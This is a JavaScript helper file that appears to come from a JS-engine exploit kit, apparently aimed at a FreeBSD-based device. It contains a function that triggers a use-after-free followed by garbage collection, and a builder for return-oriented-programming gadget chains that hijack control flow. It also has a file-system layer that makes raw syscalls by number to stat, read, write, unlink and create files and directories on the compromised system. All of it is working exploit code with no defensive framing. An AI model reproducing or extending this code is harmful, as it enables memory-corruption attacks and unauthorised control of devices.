// Utility helper functions

function make_uaf (arr) {
  var o = {}
  for (var i in { xx: '' }) {
    for (i of [arr]);
    o[i]
  }

  gc()
}

function build_rop_chain (wrapper_addr, arg1, arg2, arg3, arg4, arg5, arg6) {
  var chain = []

  if (typeof arg1 !== 'undefined') {
    chain.push(gadgets.POP_RDI_RET)
    chain.push(arg1)
  }
  if (typeof arg2 !== 'undefined') {
    chain.push(gadgets.POP_RSI_RET)
    chain.push(arg2)
  }
  if (typeof arg3 !== 'undefined') {
    chain.push(gadgets.POP_RDX_RET)
    chain.push(arg3)
  }
  if (typeof arg4 !== 'undefined') {
    // Use RCX for function wrappers (not R10)
    // Wrappers do "mov r10, rcx" before syscall
    chain.push(gadgets.POP_RCX_RET)
    chain.push(arg4)
  }
  if (typeof arg5 !== 'undefined') {
    chain.push(gadgets.POP_R8_RET)
    chain.push(arg5)
  }
  if (typeof arg6 !== 'undefined') {
    chain.push(gadgets.POP_R9_JO_RET)
    chain.push(arg6)
  }

  chain.push(wrapper_addr)
  return chain
}

/**
 * @type {Fs}
 */
var fs = {
  _stat: fn.create(188, ['string', 'bigint'], 'bigint'),
  _unlink: fn.create(10, ['string'], 'bigint'),
  _read: fn.create(3, ['bigint', 'bigint', 'number'], 'bigint'),
  _mkdir: fn.create(136, ['string', 'number'], 'bigint'),
  StatStruct: struct.create('stat', [
    { name: 'st_dev', type: 'Uint32' },
    { name: 'st_ino', type: 'Uint32' },
    { name: 'st_mode', type: 'Uint16' },
    { name: 'st_nlink', type: 'Uint16' },
    { name: 'st_uid', type: 'Uint32' },
    { name: 'st_gid', type: 'Uint32' },
    { name: 'st_rdev', type: 'Uint32' },
    { name: 'st_atim_sec', type: 'Int64' },
    { name: 'st_atim_nsec', type: 'Int64' },
    { name: 'st_mtim_sec', type: 'Int64' },
    { name: 'st_mtim_nsec', type: 'Int64' },
    { name: 'st_ctim_sec', type: 'Int64' },
    { name: 'st_ctim_nsec', type: 'Int64' },
    { name: 'st_size', type: 'Int64' },
    { name: 'st_blocks', type: 'Int64' },
    { name: 'st_blksize', type: 'Uint32' },
    { name: 'st_flags', type: 'Uint32' },
    { name: 'st_gen', type: 'Uint32' },
    { name: 'st_birthtim_sec', type: 'Int64' },
    { name: 'st_birthtim_nsec', type: 'Int64' },
  ]),
  stat: function (path) {
    var stat_buf = mem.malloc(fs.StatStruct.sizeof)
    fs._stat(path, stat_buf)
    return new fs.StatStruct(stat_buf)
  },
  exists: function (path) {
    try {
      fs.stat(path)
      return true
    } catch (e) {
      if (e instanceof SyscallError && e.errno === 2) {
        return false
      }
      throw e
    }
  },
  readFile: function (path) {
    var stat_buf = mem.malloc(0x30)
    try {
      var stat = fs.stat(path, stat_buf)
      log(stat.st_size)
    } catch (e) {
      if (e instanceof SyscallError && e.errno === 2) {
        throw new Error(`File not found: ${path}`)
      }
      throw e
    }
    var file_size = Number(stat.st_size)
    var fd = open(path, 0, 0)
    var buffer = mem.malloc(file_size)
    fs._read(fd, buffer, file_size)
    close(fd)
    return mem.allocs.get(buffer)
  },
  readTextFile: function (path) {
    var data = fs.readFile(path)
    return utils.str(utils.get_backing(data))
  },
  writeFile: function (path, data) {
    var fd = open(path, 577, 0o666) // O_WRONLY | O_CREAT | O_TRUNC
    var addr = utils.get_backing(data)
    write(fd, addr, data.length)
    close(fd)
  },
  writeTextFile: function (path, text) {
    var data = utils.cstr(text)
    fs.writeFile(path, mem.allocs.get(data))
  },
  remove: function (path) {
    if (fs.exists(path)) {
      fs._unlink(path)
    }
  },
  mkdir: function (path) {
    if (!fs.exists(path)) {
      fs._mkdir(path, 0o777)
    }
  }
}
